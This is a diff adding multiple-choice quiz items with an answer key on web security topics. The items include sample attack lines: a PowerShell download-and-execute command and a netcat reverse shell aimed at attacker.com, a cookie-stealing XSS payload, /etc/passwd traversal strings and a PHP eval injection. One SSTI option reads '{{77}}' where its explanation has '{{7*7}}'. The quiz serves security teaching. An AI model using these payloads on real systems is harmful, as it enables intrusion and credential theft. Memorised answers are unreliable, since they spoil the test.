+"correctAnswer": 1,
+"explanation": "Client-side JavaScript that takes data from the URL and inserts it into the DOM using innerHTML is an example of DOM-based XSS. This vulnerability occurs entirely in the browser when JavaScript code processes data from an untrusted source (like URL parameters) and inserts it into the page DOM in an unsafe way.",
+"weight": 1
+},
+{
+"question": "Which of the following correctly describes a JWT token structure?",
+"options": [
+    "A base64-encoded XML document with authentication details",
+    "A three-part structure with header, payload, and signature, each separated by a dot",
+    "An encrypted binary blob containing user credentials",
+    "A JSON object wrapped in a cryptographic envelope"
+],
+"correctAnswer": 1,
+"explanation": "A JWT (JSON Web Token) has a three-part structure: header, payload, and signature, each separated by a dot. The header typically contains the token type and signing algorithm, the payload contains claims (statements about the user and additional data), and the signature is used to verify the token hasn't been tampered with.",
+"weight": 1
+},
+{
+"question": "Which of the following is a common indicator of an SSRF vulnerability?",
+"options": [
+    "The application allows file uploads without proper validation",
+    "The application uses JWT tokens for authentication",
+    "The application makes server-side HTTP requests to user-supplied URLs",
+    "The application has a login form that doesn't implement CAPTCHA"
+],
+"correctAnswer": 2,
+"explanation": "An application that makes server-side HTTP requests to user-supplied URLs is a common indicator of potential SSRF (Server-Side Request Forgery) vulnerability. This could allow attackers to make the server connect to internal resources or arbitrary external systems, bypassing access controls.",
+"weight": 1
+},
+{
+"question": "Which of the following describes a correct implementation of Content Security Policy (CSP)?",
+"options": [
+    "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com",
+    "X-Security-Policy: block-all-scripts; allow-forms",
+    "Content-Security: no-eval; no-inline; trusted-sources only",
+    "Security-Policy-Definition: scripts(self, trusted.com); images(all)"
+],
+"correctAnswer": 0,
+"explanation": "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com is a correct implementation of CSP. This policy restricts all resource types to the same origin by default, while allowing scripts from both the same origin and a specific trusted CDN domain.",
+"weight": 1
+},
+{
+"question": "Which of the following tools is best suited for testing web application security?",
+"options": [
+    "Wireshark",
+    "John the Ripper",
+    "Burp Suite",
+    "Autopsy"
+],
+"correctAnswer": 2,
+"explanation": "Burp Suite is specifically designed for testing web application security. It includes tools for mapping application attack surfaces, analyzing vulnerabilities, and conducting targeted attacks. Its proxy functionality allows intercepting and modifying requests between the browser and web applications.",
+"weight": 1
+},
+{
+"question": "What command would you use to discover all hosts on a local network using Nmap?",
+"options": [
+    "nmap -p 80 192.168.1.0/24",
+    "nmap -sP 192.168.1.0/24",
+    "nmap -A 192.168.1.1",
+    "nmap --hosts-discover 192.168.1.0-255"
+],
+"correctAnswer": 1,
+"explanation": "nmap -sP 192.168.1.0/24 (also known as nmap -sn in newer versions) performs a ping scan to discover all hosts on the local network 192.168.1.0/24. This scan sends ICMP echo requests, TCP SYN to port 443, TCP ACK to port 80, and ARP requests (on local networks) to determine which hosts are up without performing port scanning.",
+"weight": 1
+},
+{
+"question": "Which of the following is an example of a buffer overflow exploit?",
+"options": [
+    "Sending a specially crafted packet that exceeds the allocated buffer size, overwriting return addresses",
+    "Injecting SQL commands into database queries",
+    "Using rainbow tables to crack password hashes",
+    "Manipulating cookies to maintain unauthorized sessions"
+],
+"correctAnswer": 0,
+"explanation": "Sending a specially crafted packet that exceeds the allocated buffer size, overwriting return addresses is an example of a buffer overflow exploit. This attack works by sending more data than a program's buffer can handle, overwriting adjacent memory including function return addresses, potentially allowing arbitrary code execution.",
+"weight": 1
+},
+{
+"question": "Which of the following HTTP methods should be disabled on a production web server if not specifically needed?",
+"options": [
+    "GET",
+    "POST",
+    "OPTIONS",
+    "TRACE"
+],
+"correctAnswer": 3,
+"explanation": "The TRACE HTTP method should be disabled on production web servers if not specifically needed. The TRACE method echoes back the received request, which can potentially be exploited in cross-site tracing (XST) attacks to steal sensitive information like cookies and authentication headers.",
+"weight": 1
+},
+{
+"question": "Which of the following correctly demonstrates a Remote Code Execution (RCE) vulnerability in PHP?",
+"options": [
+    "echo $_GET['user'];",
+    "mysql_query(\"SELECT * FROM users WHERE id = \" . $_GET['id']);",
+    "eval(\"echo \" . $_GET['cmd']);",
+    "$file = fopen($_GET['file'], 'r');"
+],
+"correctAnswer": 2,
+"explanation": "The PHP code eval(\"echo \" . $_GET['cmd']); demonstrates a Remote Code Execution vulnerability. The eval() function executes any PHP code passed to it, and in this case, it's directly using unsanitized user input from the URL parameter 'cmd', allowing attackers to execute arbitrary PHP code on the server.",
+"weight": 1
+},
+{
+"question": "Which of the following describes a subdomain takeover scenario?",
+"options": [
+    "Creating numerous fake subdomains to confuse users",
+    "Finding that company.github.io points to a GitHub Pages site that no longer exists, then creating your own with that name",
+    "Registering expired domains and setting up phishing sites",
+    "Using DNS cache poisoning to redirect subdomains"
+],
+"correctAnswer": 1,
+"explanation": "Finding that company.github.io points to a GitHub Pages site that no longer exists, then creating your own with that name is a subdomain takeover scenario. This occurs when a subdomain points to a third-party service that has been removed or deleted, allowing attackers to claim the resource and take control of the subdomain.",
+"weight": 1
+},
+{
+"question": "Which command would you use with SQLMap to test for SQL injection on a specific URL parameter?",
+"options": [
+    "sqlmap --url=\"http: //target.com/page.php?id=1\" --dbs",
+    "sqlmap -u \"http: //target.com/page.php?id=1\" -p id",
+    "sqlmap -target=\"http: //target.com/page.php?id=1\" --inject",
+    "sqlmap --scan=\"http: //target.com/page.php?id=1\" --param=\"id\""
+],
+"correctAnswer": 1,
+"explanation": "The command sqlmap -u \"http: //target.com/page.php?id=1\" -p id is used to test for SQL injection on a specific URL parameter. The -u option specifies the target URL, and the -p option indicates which parameter to test for SQL injection vulnerabilities.",
+"weight": 1
+},
+{
+"question": "What is the typical indicator of a successful Server-Side Template Injection (SSTI)?",
+"options": [
+    "The server returns a 500 internal server error",
+    "Mathematical expressions like {{77}} render as 49 in the response",
+    "The application shows database error messages",
+    "JavaScript alerts appear in the browser"
+],
+"correctAnswer": 1,
+"explanation": "Mathematical expressions like {{7*7}} rendering as 49 in the response is a typical indicator of a successful Server-Side Template Injection (SSTI). This shows that the template engine is evaluating the expression rather than treating it as literal text, confirming the presence of template injection vulnerability.",
+"weight": 1
+},
+{
+"question": "Which of the following commands would an attacker use in a 'living off the land' approach?",
+"options": [
+    "upload rootkit.exe && run rootkit.exe",
+    "powershell -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http: //attacker.com/payload.ps1')\"",
+    "nc -e /bin/bash attacker.com 4444",
+    "chmod +x backdoor && ./backdoor"
+],
+"correctAnswer": 1,
+"explanation": "The command powershell -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http: //attacker.com/payload.ps1')\" exemplifies a 'living off the land' approach. It uses PowerShell, a legitimate tool installed by default on Windows systems, to download and execute code directly in memory without dropping files to disk, making detection more difficult.",
+"weight": 1
+},
+{
+"question": "Which of the following best describes an OAuth account takeover vulnerability?",
+"options": [
+    "Manipulating OAuth tokens to escalate privileges",
+    "Using default credentials to access OAuth servers",
+    "Exploiting an insecure redirect_uri parameter to steal authorization codes",
+    "Brute-forcing OAuth client passwords"
+],
+"correctAnswer": 2,
+"explanation": "Exploiting an insecure redirect_uri parameter to steal authorization codes describes an OAuth account takeover vulnerability. If an application doesn't properly validate the redirect_uri parameter, attackers can modify it to point to a malicious site, capturing the authorization code and using it to obtain access tokens for the victim's account.",
+"weight": 1
+},
+{
+"question": "Which of the following is the main defense against XXE attacks?",
+"options": [
+    "Using parameterized SQL queries",
+    "Implementing Content Security Policy",
+    "Disabling XML external entity processing",
+    "Enabling HTTPS for all connections"
+],
+"correctAnswer": 2,
+"explanation": "Disabling XML external entity processing is the main defense against XXE (XML External Entity) attacks. This can be done by configuring XML parsers to disable DTD (Document Type Definition) processing, external entity resolution, and external document type declarations.",
+"weight": 1
+},
+{
+"question": "Which of the following correctly identifies a CORS misconfiguration?",
+"options": [
+    "Access-Control-Allow-Origin: *",
+    "X-Frame-Options: DENY",
+    "Content-Security-Policy: default-src 'self'",
+    "X-XSS-Protection: 1; mode=block"
+],
+"correctAnswer": 0,
+"explanation": "Access-Control-Allow-Origin: * can indicate a CORS misconfiguration, especially for APIs that handle sensitive information. This header allows any domain to make cross-origin requests to the server, potentially exposing sensitive data to malicious sites if credentials are also allowed with Access-Control-Allow-Credentials: true.",
+"weight": 1
+},
+{
+"question": "Which directory traversal payload might be effective even with basic input filtering?",
+"options": [
+    "../../../../../etc/passwd",
+    "....//....//....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "All of the above"
+],
+"correctAnswer": 3,
+"explanation": "All of the examples could potentially bypass directory traversal filtering. The first is a basic traversal, the second uses nested traversal patterns that might confuse filters, and the third uses URL encoding to obscure the traversal characters. Different applications may be vulnerable to different variations, so attackers often try multiple approaches.",
+"weight": 1
+},
+{
+"question": "What attack type is demonstrated by the following code: <img src=\"x\" onerror=\"fetch('https: //attacker.com/steal?cookie='+document.cookie)\">",
+"options": [
+    "SQL Injection",
+    "Cross-Site Scripting (XSS)",
+    "Command Injection",
+    "Server-Side Template Injection"
+],
+"correctAnswer": 1,
+"explanation": "This code demonstrates a Cross-Site Scripting (XSS) attack. It creates an image tag with an invalid source, triggering the onerror event handler which executes JavaScript code to steal the user's cookies and send them to an attacker-controlled domain using the fetch API.",
+"weight": 1
+},
+{
+"question": "What is the purpose of the 'X-Content-Type-Options: nosniff' HTTP header?",
+"options": [
+    "To prevent browsers from MIME-sniffing a response away from the declared content type",
+    "To disable content caching in browsers",
+    "To restrict which domains can embed your site in frames",
+    "To enforce HTTPS connections for all resources"
+],
+"correctAnswer": 0,
+"explanation": "The 'X-Content-Type-Options: nosniff' HTTP header prevents browsers from MIME-sniffing a response away from the declared content type. This helps mitigate MIME confusion attacks where a malicious file masquerades as a benign content type but contains executable code that browsers might detect and execute through content sniffing.",
+"weight": 1
+}
 ]
